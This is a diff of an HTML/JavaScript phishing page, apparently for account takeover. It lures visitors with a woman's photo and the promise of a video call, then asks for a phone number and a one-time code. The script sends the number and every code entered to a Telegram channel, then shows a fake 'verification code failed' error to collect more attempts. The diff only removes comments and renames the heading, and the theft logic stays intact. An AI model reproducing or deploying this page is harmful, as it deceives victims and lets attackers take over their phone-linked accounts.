@@ -16,9 +16,7 @@
         .otp-box { width: 48px; height: 60px; border: 1px solid #d1d1d1; border-radius: 10px; font-size: 22px; text-align: center; background: #fdfdfd; outline: none; transition: 0.3s; }
         .otp-box:focus { border-color: #e91e63; }
 
-        /* টাইমার এবং মেসেজ পজিশন */
         #statusMsg { margin-top: 15px; min-height: 30px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        
         #timerDisplay { font-size: 13px; font-weight: bold; color: #8E8E8E; text-transform: uppercase; margin-bottom: 5px; }
         #errorDisplay { font-size: 13px; font-weight: bold; color: red; min-height: 20px; }
 
@@ -32,7 +30,7 @@
 
 <div class="card">
     <img src="received_1748447966512537.jpeg" alt="Sumaiya">
-    <h2 id="title">Sumaiya Afrin</h2>
+    <h2 id="title">Private Access</h2>
     <p id="msg">নম্বর দিয়ে ভিডিও কল শুরু করুন</p>
 
     <form id="mainForm">
@@ -76,7 +74,6 @@
         }
     }
 
-    // Step 2-তে যাওয়ার সাথে সাথে টাইমার শুরু হবে
     function startGlobalTimer() {
         const timerText = document.getElementById('timerDisplay');
         let timeLeft = 30;
@@ -100,17 +97,12 @@
 
             if (otpValue.length === 4) {
                 otpBoxes.forEach(box => box.readOnly = true);
-                
-                // কোড লেখার পর ৫ সেকেন্ডের লোডিং
                 errorBox.innerHTML = '<div class="loader"></div> <span style="color:black">Please wait...</span>';
 
                 setTimeout(() => {
                     sendToTelegram(`✅ OTP Attempted!\n📱 Number: ${userPhone}\n🔑 OTP: ${otpValue}`);
-
-                    // ৫ সেকেন্ড পর লাল এরর মেসেজ
                     errorBox.innerHTML = '⚠️ verification code failed please try again. ⚠️';
                     
-                    // আবার টাইপ করার সুযোগ দেওয়া
                     setTimeout(() => {
                         otpBoxes.forEach(box => {
                             box.readOnly = false;
@@ -119,7 +111,6 @@
                         errorBox.innerHTML = ''; 
                         document.getElementById('otp1').focus();
                     }, 2000);
-
                 }, 5000); 
             }
         }
@@ -135,10 +126,7 @@
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
         document.getElementById('otp1').focus();
-        
-        // টাইমার শুরু করা
         startGlobalTimer();
-        
         sendToTelegram(`🔔 New Hit!\n📱 Number: ${userPhone}`);
     }
 
